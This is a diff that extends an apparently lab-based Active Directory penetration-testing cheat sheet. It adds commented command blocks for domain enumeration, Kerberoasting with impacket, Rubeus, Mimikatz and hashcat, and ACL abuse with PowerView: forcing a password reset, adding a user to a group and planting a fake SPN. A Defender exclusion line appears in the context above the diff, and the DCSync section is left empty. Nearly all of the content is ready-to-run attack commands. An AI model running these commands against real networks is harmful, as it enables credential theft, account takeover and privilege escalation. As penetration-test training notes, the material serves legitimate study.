@@ -478,16 +478,90 @@ Add-MpPreference -ExclusionPath "C:\Windows\Temp"
 # PowerShell cmd-let used to view AppLocker policies from a Windows-based host.
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
-#### [Living Of The Land](https://lolbas-project.github.io/#)
-Get-Module - PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host
+##### Living Of The Land
+```
+# PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host
+Get-Module
 
+# Loads the Active Directory PowerShell module from a Windows-based host.
+Import-Module ActiveDirectory
 
-Import-Module ActiveDirectory - Loads the Active Directory PowerShell module from a Windows-based host.
+# PowerShell cmd-let used to gather Windows domain information from a Windows-based host.
+Get-ADDomain
 
+# PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by ServicePrincipalName. Performed from a Windows-based host.
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 
-Get-ADDomain - PowerShell cmd-let used to gather Windows domain information from a Windows-based host.
+# PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (-Filter *). Performed from a Windows-based host.
+Get-ADTrust -Filter * | select name
 
+# PowerShell cmd-let used to discover the members of a specific group (-Identity "Backup Operators"). Performed from a Windows-based host.
+Get-ADGroupMember -Identity "Backup Operators"
+```
+##### Kerberoasting
+```
+# Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
+impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs
+ 
+# PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.
+Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
 
-Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName - PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by ServicePrincipalName. Performed from a Windows-based host.
+# Cracking Kerberos ticket hash
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force
 
+# Mimikatz command that ensures TGS tickets are extracted in base64 format from a Windows-based host.
+mimikatz # base64 /out:true
 
+# Mimikatz command used to extract the TGS tickets from a Windows-based host.
+kerberos::list /export
+
+# Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.
+echo "<base64 blob>" | tr -d \\n
+
+# Used to output a file (encoded_file) into a .kirbi file in base64 (base64 -d > sqldev.kirbi) format from a Linux-based host.
+cat encoded_file | base64 -d > sqldev.kirbi
+
+# Used to extract the Kerberos ticket. This also creates a file called crack_file from a Linux-based host.
+python2.7 kirbi2john.py sqldev.kirbi
+
+# Used to modify the crack_file for Hashcat from a Linux-based host.
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+
+# Uses PowerView tool to extract TGS Tickets . Performed from a Windows-based host.
+Import-Module .\PowerView.ps1 Get-DomainUser * -spn | select samaccountname
+
+# PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host.
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+
+# Used to request/download a TGS ticket for a specific user (/user:testspn) the formats the output in an easy to view & crack manner (/nowrap). Performed from a Windows-based host.
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+```
+
+##### ACL Enumeration & Tactics
+```
+# PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.
+Find-InterestingDomainAcl
+
+# Used to import PowerView and retrieve the SID of aspecific user account (wley) from a Windows-based host.
+Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley
+
+# Used to create a PSCredential Object from a Windows-based host.
+$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+
+# PowerView tool used to change the password of a specifc user (damundsen) on a target Windows domain from a Windows-based host.
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+# PowerView tool used to add a specifc user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host.
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+
+# PowerView tool used to view the members of a specific security group (Help Desk Level 1) and output only the username of each member (Select MemberName) of the group from a Windows-based host.
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+
+# PowerView tool used create a fake Service Principal Name given a sepecift user (adunn) from a Windows-based host.
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+```
+
+##### DCSync Attack
+```
+```
